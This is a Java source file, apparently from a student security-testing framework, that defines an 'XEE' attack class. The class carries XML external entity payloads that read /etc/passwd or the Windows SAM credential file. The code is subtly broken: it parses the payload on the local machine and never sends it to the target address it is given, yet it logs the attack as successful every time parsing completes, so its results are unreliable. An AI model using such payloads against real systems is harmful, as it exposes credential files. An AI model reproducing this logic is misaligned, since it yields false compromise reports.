package fr.isep.softsecu.attackreport.attacks;

import fr.isep.softsecu.attackreport.Attack;
import fr.isep.softsecu.attackreport.Report;
import org.w3c.dom.Document;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import java.io.StringReader;
import java.util.Arrays;
import java.util.List;


public class XEEAttack implements Attack {

    @Override
    public String getAttackName() {
        return "XEE Attack";
    }

    @Override
    public void run(Report report, String ip, int port) {
        try {
            System.out.println("Step 1: Initializing XEE Attack");
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            DocumentBuilder builder = factory.newDocumentBuilder();

            System.out.println("Step 2: Creating malicious XML");
            String osName = System.getProperty("os.name").toLowerCase();

            String maliciousXml;

            if (osName.contains("win")) {
                maliciousXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                        + "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///C:/Windows/System32/config/SAM\" >]>"
                        + "<foo>&xxe;</foo>";
            } else if (osName.contains("nix") || osName.contains("nux") || osName.contains("mac")) {
                maliciousXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                        + "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>"
                        + "<foo>&xxe;</foo>";
            } else {
                System.out.println("Unsupported operating system.");
                return;
            }

            System.out.println("Step 3: Parsing the malicious XML");
            Document document = builder.parse(new InputSource(new StringReader(maliciousXml)));

            System.out.println("Step 4: Extracting root content");
            String rootContent = document.getDocumentElement().getTextContent();
            report.append("Root Content: " + rootContent);

            System.out.println("Step 5: Extracting content of 'node' elements");
            NodeList nodeList = document.getElementsByTagName("node");
            for (int i = 0; i < nodeList.getLength(); i++) {
                Node node = nodeList.item(i);
                report.append("Node " + i + " Content: " + node.getTextContent());
            }

            System.out.println("Step 6: Extracting content of 'sensitiveInfo' elements");
            NodeList sensitiveInfoList = document.getElementsByTagName("sensitiveInfo");
            for (int i = 0; i < sensitiveInfoList.getLength(); i++) {
                Node sensitiveInfoNode = sensitiveInfoList.item(i);
                String sensitiveInfo = sensitiveInfoNode.getTextContent();
                report.append("Sensitive Information found: " + sensitiveInfo);
            }

            // Save results in the report
            System.out.println("Step 7: XEE Attack successful!");
            report.append("XEE Attack successful!");
        } catch (Exception e) {
            System.out.println("XEE Attack failed: " + e.getMessage());
            report.append("XEE Attack failed: " + e.getMessage());
        }
    }

    @Override
    public List<Class<? extends Attack>> getRequiredPreviousAttacks() {
        // Prior attacks required for this XEE attack
        return Arrays.asList(FindLoginPageAttack.class);
    }
}